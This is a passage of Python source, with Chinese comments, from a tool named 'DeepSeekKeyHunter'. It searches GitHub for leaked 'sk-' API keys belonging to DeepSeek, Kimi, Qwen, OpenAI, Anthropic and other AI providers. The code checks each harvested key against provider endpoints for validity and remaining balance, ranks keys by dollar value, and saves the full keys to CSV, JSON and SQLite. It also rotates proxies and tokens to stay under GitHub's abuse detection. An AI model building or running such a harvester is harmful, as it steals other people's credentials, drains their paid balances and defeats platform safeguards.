        on_key: 可选流式回调——每提取到一个 key 立即调用（watch 端扫到即提交，
        不必等整条查询结束才批量提交）。回调参数是单个 key 的 dict。"""
        max_pages_to_fetch = max_pages if max_pages is not None else getattr(self, 'scan_pages', 5)
        # 认证状态在一次运行内不变；缓存避免每条查询 shell out 到 gh CLI（~50ms+）
        if not hasattr(self, "_authed"):
            self._authed = ScannerEngine.check_gh_auth()
        page_delay = self.search_delay if self._authed else max(self.search_delay, 6.0)
        items = []
        for page in range(1, max_pages_to_fetch + 1):
            if page > 1:
                time.sleep(page_delay)  # 页间延迟 — 根据认证状态自动调整
            batch = self._gh_search(query, per_page=100, page=page, with_text_matches=True, token=token)
            if not batch:
                break
            items.extend(batch)
            # 首页无结果 → 跳过后续页（自适应页数）
            if page == 1 and not batch:
                break
            if len(batch) < 100:  # 最后一页, 无需继续
                break
        if not items:
            return {}

        # 优先使用 text_matches 直接提取 Key (无需下载原始文件, 速度快 100 倍)
        keys_from_text = self._extract_keys_from_text_matches(
            items, on_key=on_key, query=query)
        if keys_from_text:
            self.log(f"  text_matches 提取: {len(keys_from_text)} 个 Key")
            return keys_from_text

        # 如果 text_matches 没找到, 回退到下载原始文件。
        # 只下载前 N 个 items：回退触发时 items 可达 1000+（多页深挖），
        # 全量下载按 15 并发 × 每文件 ~10s 会卡 15-20 分钟（实测 23:17-23:37 空白）。
        # 前 30 个（API 相关性排序最前）足以代表该查询，收益递减远低于卡死代价。
        _FALLBACK_MAX_DOWNLOADS = 30
        if len(items) > _FALLBACK_MAX_DOWNLOADS:
            self.log(f"  text_matches 无结果, 回退下载前 {_FALLBACK_MAX_DOWNLOADS}/{len(items)} 个文件...")
        else:
            self.log("  text_matches 无结果, 回退到原始文件下载...")
        return self._scan_one_query_threaded(
            items[:_FALLBACK_MAX_DOWNLOADS], on_key=on_key, query=query)

    def _extract_keys_from_text_matches(self, items: list,
                                        on_key: Callable[[dict], None] = None,
                                        query: str | None = None) -> dict:
        """Extract keys directly from GitHub search text_matches (fast, no raw file fetch needed)."""
        all_keys = {}
        for item in items:
            repo = item.get("repository", {}).get("full_name", "")
            path = item.get("path", "")
            html_url = item.get("html_url", "")
            if not repo or not path:
                continue
            if any(fnmatch.fnmatch(repo, p) for p in self.exclude_repos):
                continue
            if self._is_likely_test_key(path, repo):
                continue

            text_matches = item.get("text_matches", [])
            for match in text_matches:
                fragment = match.get("fragment", "")
                keys = self.key_pattern.findall(fragment)
                for k in keys:
                    if not is_bad_key(k, self.extra_bad_patterns):
                        is_new = k not in all_keys
                        if is_new:
                            all_keys[k] = {"key": k, "key_preview": k[:10] + "..." + k[-4:],
                                           "repos": [], "query": query or "unknown",
                                           "_repo_set": set()}
                        if repo not in all_keys[k]["_repo_set"]:
                            all_keys[k]["_repo_set"].add(repo)
                            all_keys[k]["repos"].append({"repo": repo, "file": path, "url": html_url})
                            self.log(f"  [KEY] {k[:10]}...{k[-4:]} | {repo}/{path}")
                            # 流式：key 首次发现即回调（watch 端立即提交，不等整条查询）。
                            # 同 key 后续 repo 只补来源，不重复回调（验证一次足够）。
                            if on_key is not None and is_new:
                                try:
                                    on_key(all_keys[k])
                                except Exception:
                                    pass
        # 清理临时 _repo_set 字段
        for v in all_keys.values():
            v.pop("_repo_set", None)
        return all_keys

    # ── Fresh Repo 扫描：最近推送的项目 ──────────────────────────────
    # Code Search 不支持日期过滤（pushed:/created: 均无效，实测 0 结果），
    # 但 **Repo Search 支持 pushed: 日期过滤**（10次/分钟/token，与 Code Search 独立配额）。
    # 策略：
    #   1. Repo Search 抓"最近 N 天推送、含平台关键词"的 repo 列表（pushed:>DATE）
    #   2. 按 3 个一组合并成 Code Search 的 repo: 限定符（OR 语义）精扫
    #      （repo:a repo:b repo:c + key 前缀 + filename 过滤）
    #   3. 每轮推进日期窗口（老窗口→更新窗口），持续覆盖"新推送"项目

    _FRESH_REPO_LOOKBACK_DAYS = 14     # 滚动窗口:每轮扫最近 14 天推送的 repo(更广覆盖)
    _FRESH_REPO_BATCH = 3              # 每轮 Code Search 合并的 repo 数（实测多 repo: 有效）
    _FRESH_REPO_PER_TOKEN = 20         # 每个 token 每轮最多扫的 repo 数
    # 注意:_fresh_repo_round 必须是实例属性(在 __init_route_state 初始化)——
    # 类属性会让 watch 长驻实例与临时 engine 实例共享轮换计数,互相推进节奏
    # (与 route state 当初改实例级是同一理由,此处曾遗漏)。

    # 新鲜 repo 搜索关键词:每轮换一个(不再是每天一个)——15 轮覆盖全部平台。
    # 旧设计按日期索引:窗口推进到边界后关键词永远卡死(如 openrouter 整天 0 结果)。
    _FRESH_REPO_KEYWORDS = [
        "deepseek", "kimi", "moonshot", "qwen", "dashscope",
        "claude", "anthropic", "openrouter", "ai", "llm",
        "chatgpt", "openai", "gemini", "api", "agent",
    ]

    def _gh_repo_search(self, query: str, per_page: int = 30,
                        token: str = None) -> list[dict]:
        """GitHub Repo Search（独立配额桶 resource=search，实测 30/min/token，
        与 code_search 的 10/min 互不占用）。与 _gh_search 共用路由逻辑。
        v2.5: 同样走配额账本——均匀铺排,永不撞墙。"""
        if token and not self._is_token_healthy(token):
            return []
        quota_path = "/search/repositories"
        quota_wait = self._rate_sched.wait_before(token, quota_path)
        if quota_wait > 15.0:
            # fresh-repo 低频调用:槽位在远处(被外部占用)不空等,跳过本轮
            self.log(f"Repo Search 配额排期中({quota_wait:.0f}s 后),跳过本轮 fresh-repo", "info")
            return []
        if quota_wait > 0:
            time.sleep(quota_wait)
        proxies = self._route_for_token(token)
        headers = {
            "Accept": "application/vnd.github+json",
            "User-Agent": "DeepSeekKeyHunter/5.0",
            "X-GitHub-Api-Version": "2022-11-28",
        }
        if token:
            headers["Authorization"] = f"Bearer {token}"
        encoded = urllib.parse.quote(query, safe=":+")
        url = (f"https://api.github.com/search/repositories?q={encoded}"
               f"&sort=updated&order=desc&per_page={per_page}")
        try:
            r = requests.get(url, headers=headers, timeout=20, proxies=proxies)
            self._rate_sched.observe(token, quota_path, r.headers)
            if r.status_code == 200:
                self._record_token_success(token)
                return r.json().get("items", [])
            if r.status_code == 401:
                self._record_token_401(token)
                return []
            if r.status_code in (429, 403, 503):
                self._on_ip_rate_limit(token)
                ra = r.headers.get("Retry-After")
                try:
                    self._rate_sched.push(token, quota_path,
                                          time.time() + (int(ra) if ra else 60))
                except (TypeError, ValueError):
                    pass
                self.log(f"GitHub Repo Search {r.status_code} 限流（略过本轮 fresh-repo）", "info")
                return []
        except requests.RequestException as e:
            self.log(f"GitHub Repo Search 网络错误: {e}", "warning")
        return []

    def scan_fresh_repos(self, token: str = "", on_key: Callable[[dict], None] = None,
                         days: int = 0) -> list[str]:
        """扫最近推送的项目：Repo Search(pushed:>DATE) → 分组 Code Search 精扫。

        滚动窗口:每轮都查「最近 lookback 天推送」的 repo(不是推进式窗口——
        旧设计窗口推到昨天就永久卡死,新推送 repo 再也扫不到)。
        配合关键词轮换(每轮换词 + 同轮试 3 词)广覆盖新推送项目。

        token: 使用的 GitHub token（为空=匿名）
        on_key: 流式回调（与 _scan_one_query 相同语义）
        days: 指定回看天数（0=用 _FRESH_REPO_LOOKBACK_DAYS）
        return: 发现的新 key 列表
        """
        lookback = days or self._FRESH_REPO_LOOKBACK_DAYS
        key = token or "__unauth__"
        now = time.time()
        start_ts = now - lookback * 86400
        start_date = time.strftime("%Y-%m-%d", time.gmtime(start_ts))
        # 关键词轮换：每轮换一个（非每天）——旧设计按日期索引,窗口推进到边界后
        # 关键词卡死(如 openrouter 整天 0 结果)。15 轮覆盖全部平台关键词。
        round_idx = self._fresh_repo_round.get(key, 0)
        self._fresh_repo_round[key] = round_idx + 1
        # 同轮最多试 3 个关键词:第一个无结果立即换下一个(高命中词如 deepseek
        # 排在前面),避免"今天轮到低产词"就空转整轮。
        repos = []
        for try_offset in range(3):
            kw_idx = (round_idx + try_offset) % len(self._FRESH_REPO_KEYWORDS)
            kw = self._FRESH_REPO_KEYWORDS[kw_idx]
            repo_query = f"{kw} pushed:>{start_date}"
            self.log(f"fresh-repo: 查询 {repo_query} (token {'有' if token else '匿名'})", "info")
            repos = self._gh_repo_search(repo_query, per_page=self._FRESH_REPO_PER_TOKEN,
                                         token=token)
            if repos:
                break
            # Repo Search 配额 10/min;连续换词会消耗配额,无结果时停一下
            if try_offset < 2:
                time.sleep(6.5)
        if not repos:
            self.log("fresh-repo: Repo Search 无结果（3 个关键词均空）", "info")
            return []

        full_names = [r["full_name"] for r in repos if r.get("full_name")]
        if not full_names:
            self.log(f"fresh-repo: 无有效 repo 名（{len(repos)} 个原始结果）", "info")
            return []

        # 分组精扫：repo: 限定符（OR 语义，Code Search 实测支持多 repo:）
        found: list[str] = []
        grouped = [full_names[i:i + self._FRESH_REPO_BATCH]
                   for i in range(0, len(full_names), self._FRESH_REPO_BATCH)]
        self.log(f"fresh-repo: {len(full_names)} 个 repo → {len(grouped)} 组精扫", "info")
        for group in grouped:
            if self._stop_requested:
                break
            repo_q = " ".join(f"repo:{r}" for r in group)
            # 只扫高产出文件类型 + key 特征（env 最高产，其余按需轮转）。
            # 只用 text_matches 直提，**不回退下载原始文件**——fresh-repo 是
            # 广撒网模式（命中率低），下载 3 个 repo 的文件代价远高于收益；
            # 这些 repo 若有真 key，主扫描的常规查询也会覆盖到。
            query = f"sk- filename:env {repo_q}"
            try:
                # 精扫直接调 _gh_search 但传入 skip_wait=True：**不等待配额重置**。
                # fresh-repo 是低优先补充扫描，等 30-80s 配额会阻塞主轮次
                # （主扫描 7.5s pacing 已吃满 Code Search 配额）——配额不够就
                # 跳过本轮，下轮 fresh-repo 窗口继续推进时再试。
                items = self._gh_search(query, per_page=100, page=1,
                                        with_text_matches=True, token=token,
                                        skip_wait=True)
                if items:
                    keys = self._extract_keys_from_text_matches(
                        items, on_key=on_key, query=query)
                    for k in keys:
                        if k not in found:
                            found.append(k)
            except Exception as e:
                self.log(f"fresh-repo 精扫 {group[0]}.. 异常: {e}", "warning")
        if found:
            self.log(f"fresh-repo: {len(found)} 个 key / {len(full_names)} 个 repo (推送于 {start_date} 后)", "info")
        return found

    def _scan_one_query_threaded(self, items: list,
                                 on_key: Callable[[dict], None] = None,
                                 query: str | None = None) -> dict:
        """Threaded concurrent fetch of raw files and key extraction.
        Uses requests + ThreadPoolExecutor instead of aiohttp for Windows compatibility."""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        all_keys = {}
        seen = set()
        seen_lock = __import__('threading').Lock()

        def fetch_and_extract(item):
            repo = item.get("repository", {}).get("full_name", "")
            path = item.get("path", "")
            html_url = item.get("html_url", "")
            if not repo or not path:
                return []
            if any(fnmatch.fnmatch(repo, p) for p in self.exclude_repos):
                return []
            if self._is_likely_test_key(path, repo):
                return []

            cache = f"{repo}/{path}"
            with seen_lock:
                if cache in seen:
                    return []
                seen.add(cache)

            branch = "main"
            if "/blob/" in html_url:
                branch = html_url.split("/blob/")[1].split("/")[0]

            text = self._fetch_raw(repo, path, branch)
            if not text:
                return []

            keys = self.key_pattern.findall(text)
            keys = [k for k in keys if not is_bad_key(k, self.extra_bad_patterns)]
            return [(k, repo, path, html_url) for k in keys]

        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {executor.submit(fetch_and_extract, item): item for item in items}
            done_count = 0
            total = len(futures)
            for future in as_completed(futures):
                done_count += 1
                # 进度心跳:回退下载 30 个文件约需 20-40s,期间 TUI/日志完全静默,
                # 观感像"卡死在 0"(2026-09-21 23:27 用户误判)。每 10 个报一次。
                if done_count % 10 == 0 or done_count == total:
                    self.log(f"  回退下载进度 {done_count}/{total}")
                try:
                    results = future.result(timeout=30)
                except Exception:
                    continue
                for k, repo, path, html_url in results:
                    is_new = k not in all_keys
                    if is_new:
                        all_keys[k] = {"key": k, "key_preview": k[:10] + "..." + k[-4:],
                                       "repos": [], "query": query or "unknown",
                                       "_repo_set": set()}
                    if repo not in all_keys[k]["_repo_set"]:
                        all_keys[k]["_repo_set"].add(repo)
                        all_keys[k]["repos"].append({"repo": repo, "file": path, "url": html_url})
                        self.log(f"  [KEY] {k[:10]}...{k[-4:]} | {repo}/{path}")
                        # 流式：key 首次发现即回调（watch 端立即提交，不等整条查询）
                        if on_key is not None and is_new:
                            try:
                                on_key(all_keys[k])
                            except Exception:
                                pass

        # 清理临时 _repo_set 字段
        for v in all_keys.values():
            v.pop("_repo_set", None)
        return all_keys

    def _verify_dict(self, keys_dict: dict) -> list:
        """验证一个 key 字典, 返回结果列表 (使用 requests + ThreadPoolExecutor)"""
        if not keys_dict:
            return []
        import threading
        from concurrent.futures import ThreadPoolExecutor, as_completed

        results = []
        total = len(keys_dict)
        lock = threading.Lock()

        from providers import PERCENT_PROVIDERS, USD_PROVIDERS, UnifiedKeyVerifier, VerifyResult

        # 每个 key 各建一个 verifier/候选池会造成线程抖动；同一批共享一个通道。
        verifier = UnifiedKeyVerifier(
            proxy=self.proxy, allow_chat_probe=self.allow_chat_probe,
            probe_unclear=self.probe_unclear,
            rate_limiter=self.provider_rate_limiter,
            candidate_workers=self.concurrency,
        )

        def verify_one(api_key, info):
            # 多平台验证(对齐 watch 模式 broker._verify_one 语义):
            # sk-* 通用前缀匹配 10+ 平台,UnifiedKeyVerifier 按格式+上下文识别平台
            # → GET models 端点验证 → 余额查询；chat 探测仅显式 opt-in 后发送。不再只打 deepseek 余额端点
            # (旧实现对 kimi/qwen 等 sk-* key 会 401 误判 invalid)。
            repos = info.get("repos", []) if isinstance(info, dict) else []
            # v2.4.9: 查询串拼进 context(对齐 watch_tui._verify_one),让
            # identify 的 query-term 平台信号真正生效。
            context = (info.get("query", "") or "") if isinstance(info, dict) else ""
            context += " " + " ".join(f"{r.get('repo','')}/{r.get('file','')}" for r in repos[:5]
                                      if isinstance(r, dict))
            v = verifier.verify_key(api_key, context=context)
            status = v.get("status", "")
            valid = status in (VerifyResult.VALID_ACTIVE.value, VerifyResult.VALID_ZERO.value,
                               VerifyResult.VALID_NO_BALANCE.value)
            balance = v.get("balance") or 0.0
            provider_id = v.get("provider", "unknown")
            if provider_id in PERCENT_PROVIDERS:
                currency = "PERCENT"  # Coding Plan 周额度百分比,非金额
            elif provider_id in USD_PROVIDERS:
                currency = "USD"
            else:
                currency = "CNY"
            return {
                "key": api_key,
                "key_preview": info.get("key_preview", api_key[:10] + "..." + api_key[-4:]),
                "valid": valid,
                "status": status,
                "provider": provider_id,
                "balance": balance,
                "balance_usd": convert_to_usd(balance, currency, self.usd_cny_rate),
                "balance_cny": convert_to_cny(balance, currency, self.usd_cny_rate),
                "primary_currency": currency,
                "repos": info.get("repos", []),
                "source": info.get("source", "unknown"),
                "query": info.get("query", "unknown"),
                "verified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

        try:
            executor = ThreadPoolExecutor(max_workers=self.concurrency)
            try:
                futures = {executor.submit(verify_one, k, info): (k, info)
                           for k, info in keys_dict.items()}
                for future in as_completed(futures):
                    k, info = futures[future]
                    try:
                        entry = future.result(timeout=120)
                    except Exception:
                        entry = {"key": k, "valid": False, "status": "error",
                                 "provider": "unknown", "repos": info.get("repos", []),
                                 "source": info.get("source", "unknown"),
                                 "query": info.get("query", "unknown"),
                                 "verified_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
                    with lock:
                        if entry.get("valid"):
                            self._valid_count += 1
                        # 报真实完成数(恒 0 曾让 GUI 进度条在验证阶段钉死)
                        self.progress_callback(len(results) + 1, total, "verify")
                        results.append(entry)
            finally:
                # 不无限 join:挂死线程不再阻塞整条流水线退出(with 语义的
                # shutdown(wait=True) 会让 future.result 的 timeout 形同虚设)
                executor.shutdown(wait=False, cancel_futures=True)
        finally:
            verifier.close()
        return results

    def _persist_results(self, results: list[dict]) -> None:
        """单次扫描也写入长期 SQLite 账本，供转化率/保留策略分析。"""
        if not results:
            return
        try:
            import store as _store
            db_path = os.path.join(self.output_dir, "darkforest.db")
            conn = _store.connect(db_path)
            try:
                for result in results:
                    _store.upsert(conn, result)
                for result in results:
                    if result.get("valid"):
                        _store.record_history(conn, result)
            finally:
                conn.close()
        except Exception as e:
            self.log(f"SQLite 长期账本写入失败: {e}", "warning")

    def _save_incremental(self, valid_results: list, round_idx: int, total_rounds: int):
        """增量保存: JSON + CSV 全部覆写（CSV 不再追加，避免重复）"""
        os.makedirs(self.output_dir, exist_ok=True)
        sorted_r = self.sort_results(valid_results)

        # CSV 覆写 (去重)
        csv_path = os.path.join(self.output_dir, "deepseek_keys_result.csv")
        try:
            with open(csv_path, "w", encoding="utf-8", newline="") as f:
                f.write("Key预览,完整Key,有效,原始余额,币种,USD等值,CNY等值,仓库名,文件名,文件路径,仓库链接,验证时间\n")
                for r in sorted_r:
                    repos_str = "; ".join([x["repo"] for x in r.get("repos", [])[:3]])
                    file_names = "; ".join([x.get("file", "").split("/")[-1] for x in r.get("repos", [])[:3]])
                    file_paths = "; ".join([x.get("file", "") for x in r.get("repos", [])[:3]])
                    repo_urls = "; ".join([x.get("url", "") for x in r.get("repos", [])[:3]])
                    cur = r.get("primary_currency", "N/A")
                    f.write(f'{r["key_preview"]},{r["key"]},{r["valid"]},'
                            f'{r["balance"]:.4f},{cur},{r["balance_usd"]:.2f},{r["balance_cny"]:.2f},'
                            f'"{repos_str}","{file_names}","{file_paths}","{repo_urls}",{r["verified_at"]}\n')
        except PermissionError:
            _logger.warning("增量 CSV 保存被文件占用跳过(Excel/杀软?),本轮跳过下轮重试")

        # JSON 覆写
        json_path = os.path.join(self.output_dir, "deepseek_keys_result.json")
        try:
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(sorted_r, f, ensure_ascii=False, indent=2)
        except PermissionError:
            _logger.warning("增量 JSON 保存被文件占用跳过")

        self.log(f"  增量保存: {len(valid_results)} 条有效Key | 轮次 {round_idx+1}/{total_rounds}")

    def _save_final(self, valid_results: list):
        """最终保存"""
        sorted_r = self.sort_results(valid_results)
        os.makedirs(self.output_dir, exist_ok=True)

        # JSON
        json_path = os.path.join(self.output_dir, "deepseek_keys_result.json")
        try:
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(sorted_r, f, ensure_ascii=False, indent=2)
            self.log(f"最终保存 JSON: {json_path} ({len(sorted_r)} 条)")
        except Exception as e:
            self.log(f"JSON 保存失败: {e}", "error")

        # Markdown
        md_path = os.path.join(self.output_dir, "deepseek_keys_result.md")
        try:
            with open(md_path, "w", encoding="utf-8") as f:
                f.write("# DeepSeek Key Hunter - Scan Results\n\n")
                f.write(f"**Scan Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"**Exchange Rate:** 1 USD = {self.usd_cny_rate} CNY\n\n")
                f.write("## Summary\n\n")
                f.write("| Metric | Value |\n|---|---|\n")
                f.write(f"| Valid Keys | {len(sorted_r)} |\n")
                if sorted_r:
                    # 欠费账号(负余额)不计入总价值，与 run() 日志口径一致;
                    # PERCENT(周额度%)同样不计入——百分比不是钱
                    positive = [r for r in sorted_r if r["balance_usd"] > 0]
                    money = [r for r in positive
                             if (r.get("primary_currency") or "").upper() != "PERCENT"]
                    total_usd = sum(r["balance_usd"] for r in money)
                    total_cny = sum(r["balance_cny"] for r in money)
                    f.write(f"| Total USD | ${total_usd:.2f} |\n")
                    f.write(f"| Total CNY | ¥{total_cny:.2f} |\n")
                    f.write(f"| Max Balance | ${max(r['balance_usd'] for r in sorted_r):.2f} |\n")
                    f.write(f"| Positive Balance Keys | {len(positive)} |\n")
                f.write("\n## Keys by USD Value\n\n")
                f.write("| # | Key | Balance | USD | CNY | Source |\n")
                f.write("|---|---|---|---|---|---|\n")
                for i, r in enumerate(sorted_r):
                    src = r["repos"][0]["repo"] if r.get("repos") else "N/A"
                    cur = r.get("primary_currency", "USD")
                    f.write(f"| {i+1} | `{r['key_preview']}` | {cur} {r['balance']:.4f} | "
                            f"${r['balance_usd']:.2f} | ¥{r['balance_cny']:.2f} | {src} |\n")
            self.log(f"最终保存 Markdown: {md_path}")
        except Exception as e:
            self.log(f"Markdown 保存失败: {e}", "error")

    def _should_stop(self) -> bool:
        if self._stop_requested:
            return True
        if self.max_duration > 0:
            elapsed = time.time() - self._start_time
            if elapsed >= self.max_duration:
                return True
        if self.max_valid_keys > 0 and self._valid_count >= self.max_valid_keys:
            return True
        return False

    def _stop_reason(self) -> str:
        if self._stop_requested:
            return "手动停止"
        if self.max_duration > 0 and time.time() - self._start_time >= self.max_duration:
            return f"达到时间限制 ({self.max_duration}s)"
        if self.max_valid_keys > 0 and self._valid_count >= self.max_valid_keys:
            return f"达到有效 Key 数量目标 ({self.max_valid_keys})"
        return ""

    # ---- GitHub Search ----

    def _gh_search(self, query: str, per_page: int = 100, page: int = 1,
                   with_text_matches: bool = False, token: str = None,
                   skip_wait: bool = False) -> list:
        """GitHub Code Search via direct HTTP API (no gh CLI dependency).
        Uses token from env var or gh CLI for authenticated access (10 req/min).
        Tracks X-RateLimit-Remaining to avoid hitting the rate limit.
        If with_text_matches=True, returns items with text_matches field for direct key extraction.
        token: 可选，指定使用的 GitHub Token（多 Token 并行时使用）。
        skip_wait: True 时配额将耗尽不等待重置（低优先调用，如 fresh-repo 精扫——
        等 30-80s 会阻塞主轮次；配额不够就跳过本轮，下轮再试）。"""
        # 主动节流：GitHub Code Search 限流 10 次/分钟（per token），均匀间隔 _gh_pacing_interval。
        # 关键：按 token 隔离 pacing —— 每个 token 有独立的 10次/分钟 配额，
        # 不同 token 的 pacing 互不阻塞，因此多 token 并发可获得 N× 吞吐。
        # （若用单一全局 pacemaker，多 token 会被串行化，等于浪费 N-1 个 token 的配额。）
        # v2.5: token 归一化提前——pacing_key/路由/配额账本三处必须用同一个
        # token,否则 token=None 时路由直连而请求带 gh token(多代理旁路)。
        if token is None:
            token = self.get_gh_token()
        if token and not self._is_token_healthy(token):
            return []
        # v2.4.7: pacing key 从 token 改为 proxy IP(get_pacing_key 内部处理)
        pacing_key = self.get_pacing_key(token)
        # Self-quiet: skip if under secondary rate limit cooldown
        if self._secondary_limit_until.get(pacing_key, 0) > time.time():
            return []
        # Burst guard: if this token just exited self-quiet (<30s ago),
        # add a 30s cooldown to prevent simultaneous burst across tokens
        sq_until = self._secondary_limit_until.get(pacing_key, 0)
        sq_cleared_ago = time.time() - sq_until
        if 0 < sq_cleared_ago < 30:
            time.sleep(30 - sq_cleared_ago)
            self._gh_pacing_calls[pacing_key] = time.time()  # reset pacing after cooldown
        # v2.5 原生配额层:header 驱动均匀铺排,主配额(10/min/token)永不提前
        # 打光 → 永不 sleep-to-reset、永不主配额 429。
        # 深度退避守卫:配额层等待 >90s(429 push/多窗口外部占用)绝不干等——
        # 转成 self-quiet 静默冷却(v2.4.5 "wait>90 不死等"语义的配额层等价),
        # 期间该桶所有调用在 secondary 检查处静默返回,不刷屏不卡线程。
        quota_path = "/search/code"
        quota_wait = self._rate_sched.wait_before(token, quota_path)
        if quota_wait > 90.0:
            self._secondary_limit_until[pacing_key] = (
                time.time() + min(quota_wait, 900.0))
            self.log(f"GitHub 配额深度退避 {quota_wait:.0f}s（限流惩罚/外部占用）"
                     f"——静默冷却，下轮再试", "warning")
            return []
        # skip_wait(低优先)遇到槽位在远处(>10s)直接跳过本轮,不空等
        if skip_wait and quota_wait > 10.0:
            self.log(f"GitHub 配额排期中(槽位 {quota_wait:.0f}s 后),fresh-repo 跳过本轮精扫", "info")
            return []
        with self._gh_pacing_lock:
            lock = self._gh_pacing_locks.setdefault(pacing_key, threading.Lock())
        with lock:
            now = time.time()
            # v2.5: IP 层现在只是兜底地板(单/直连共享桶 6.0s ≈ 10 req/min IP,
            # 低于滥用阈值 15-20/min 的一半)——正常节奏由配额层(≈6s/token)
            # 主导,IP 层只在 429 降档/惩罚箱时抬高。多代理每 IP 1-2 token,
            # 配额层铺排后 IP 级恒 ≤10/min/IP,结构性不撞滥用检测。
            in_penalty_box = now < self._penalty_box_until
            # IP 级 429 计数(所有 token 合计,滥用检测是 IP 级)
            n_global_429 = sum(1 for t in self._global_429_times if now - t < 3600)
            last_429 = self._gh_last_429.get(pacing_key, 0.0)
            # v2.4.9: 惩罚/降档值必须 ≥ 基线——单代理基线 = 4.0×token 数,
            # token≥7 时基线 28s+,固定 25s/15s 会"惩罚反而提速"。
            base = self._baseline_interval(pacing_key)
            if in_penalty_box:
                interval = max(25.0, base)                # 惩罚箱
            elif now - last_429 < 120:                    # 最近 2 分钟内有 429
                interval = max(15.0, base)                # 降档
            elif n_global_429 >= 3:                       # 1h 内 IP 级 ≥3 次
                interval = max(25.0, base)                # 惩罚箱
            else:
                interval = base
            self._gh_pacing_interval[pacing_key] = interval
            elapsed = now - self._gh_pacing_calls.get(pacing_key, 0.0)
            # 动态 pacing：总周期 = interval×抖动，sleep = max(0, 周期 - 上次请求耗时)
            # 抖动只作用于实际等待，字典记录标称基线（便于测试/观测）。
            req_time = self._gh_last_req_time.get(pacing_key, 0.0)
            period = interval * random.uniform(0.92, 1.08)
            sleep_time = max(0.0, period - max(elapsed, req_time))
            # v2.5: 取 IP 层与配额层的较大者——配额层(≈6s)正常主导;
            # IP 层降档/惩罚时抬高;两层语义正交(per-token 硬限制 vs IP 滥用)。
            quota_wait = self._rate_sched.wait_before(token, quota_path)
            if skip_wait:
                # skip_wait 只服从配额硬限制(IP 软限速跳过——fresh-repo 低频)
                sleep_time = quota_wait
            else:
                sleep_time = max(sleep_time, quota_wait)
            if sleep_time > 0:
                time.sleep(sleep_time)
            # skip_wait 调用（fresh-repo 精扫）不更新 pacing 时间戳——
            # 否则会重置主扫描的 pacing 计时，让主扫描多等一个完整间隔
            if not skip_wait:
                self._gh_pacing_calls[pacing_key] = time.time()

        # Route-aware proxy selection: distribute tokens across direct/proxy
        # to avoid IP-level secondary rate limits when multiple accounts share an IP.
        # Each token gets a deterministic route based on its position in the token list.
        proxies = self._route_for_token(token)

        encoded = urllib.parse.quote(query, safe=":+")
        # sort=indexed：按索引时间倒序——Code Search 不支持日期过滤(pushed:)，
        # 这是"抓最新索引结果"（即新泄露）的正确方式。
        url = (f"https://api.github.com/search/code?q={encoded}&per_page={per_page}"
               f"&page={page}&sort=indexed&order=desc")
        if token is None:
            token = self.get_gh_token()
        headers = {
            "Accept": "application/vnd.github.text-match+json" if with_text_matches else "application/vnd.github+json",
            "User-Agent": "DeepSeekKeyHunter/5.0",
            "X-GitHub-Api-Version": "2022-11-28",
        }
        if token:
            headers["Authorization"] = f"Bearer {token}"

        max_retries = 3
        for attempt in range(max_retries):
            try:
                req_start = time.time()
                r = requests.get(url, headers=headers, timeout=20, proxies=proxies)
                req_elapsed = time.time() - req_start
                # 记录请求耗时：动态 pacing 据此扣除，保证总周期 = interval
                with self._gh_pacing_lock:
                    self._gh_last_req_time[pacing_key] = req_elapsed
                # v2.5: 每个响应都刷新配额账本(X-RateLimit-*),调度的唯一真相
                # 来源。旧的 remaining≤2 预检 + sleep-to-reset 块已删除——
                # 均匀铺排让窗口永不提前打光,等待全部前移到请求前
                # (wait_before),响应侧不再有窗口尾长睡与刷屏告警。
                self._rate_sched.observe(token, quota_path, r.headers)

                if r.status_code == 200:
                    data = r.json()
                    self._record_token_success(token)
                    return data.get("items", [])
                if r.status_code == 401:
                    # 401 = 凭据永久失效（token 过期/撤销）。重试无意义——
                    # 否则每条查询浪费 ~15s 退避 sleep 且 0 收益（典型"突然卡死"诱因）。
                    _logger.warning("github HTTP 401 bad credentials; not retrying")
                    self._record_token_401(token)
                    return []
                if r.status_code in (429, 403):
                    # IP-level rate limit: switch route (direct ↔ proxy) for this token
                    self._on_ip_rate_limit(token)
                    # Check for secondary rate limit first (403 body text)
                    is_rate_limit = bool(
                        r.headers.get("Retry-After")
                        or r.headers.get("X-RateLimit-Remaining") == "0"
                    )
                    if not is_rate_limit and r.status_code == 403:
                        body = r.text.lower()
                        is_secondary = any(kw in body for kw in [
                            "api rate limit exceeded", "secondary rate limit",
                            "abuse detection", "temporarily blocked",
                        ])
                        if is_secondary:
                            self.log("GitHub 次级限流检测，self-quiet 5min", "warning")
                            self._secondary_limit_until[pacing_key] = time.time() + 300
                            return []
                    if not is_rate_limit:
                        _logger.warning("github HTTP %s forbidden (non-rate-limit); not retrying", r.status_code)
                        self.log(f"GitHub HTTP {r.status_code}: 权限/凭据问题，跳过", "error")
                        return []
                    retry_after = r.headers.get("Retry-After")
                    if retry_after:
                        # 对齐 _gh_repo_search 的防御:HTTP-date/非数字形式不炸流水线
                        # (ValueError 不是 requests.RequestException,裸解析曾可穿透
                        #  _save_final 之前的全部护栏)
                        try:
                            wait = int(retry_after)
                        except (TypeError, ValueError):
                            wait = 60
                    else:
                        reset_ts = int(r.headers.get("X-RateLimit-Reset", 0))
                        wait = max(5, reset_ts - int(time.time())) if reset_ts else 60
                    # v2.5: 限流退避也写进配额账本——同 token 的其他请求路径
                    # (页翻/并行桶)一起退让,不只本条查询等待
                    self._rate_sched.push(token, quota_path, time.time() + wait)
                    _logger.debug("github HTTP %s throttled wait=%ds attempt=%d", r.status_code, wait, attempt + 1)
                    # skip_wait（fresh-repo 等低优先调用）：任何限流等待都跳过本轮
                    if skip_wait:
                        self.log("GitHub 限流（fresh-repo 跳过本轮精扫）", "info")
                        return []
                    # 长惩罚期（>90s）不干等：放弃本轮查询，下轮轮转再试。
                    # 多次实例竞争 token 会触发 GitHub 次级限流（Retry-After 可达 10+ 分钟），
                    # 死等会卡死整条 github_search 线程，外部源照常跑也不受影响。
                    # Wait >300s = definite secondary limit, self-quiet instead of skip
                    if wait > 300:
                        self.log(f"GitHub 次级限流 {wait}s，self-quiet 5min", "warning")
                        self._secondary_limit_until[pacing_key] = time.time() + 300
                        return []
                    if wait > 90:
                        self.log(
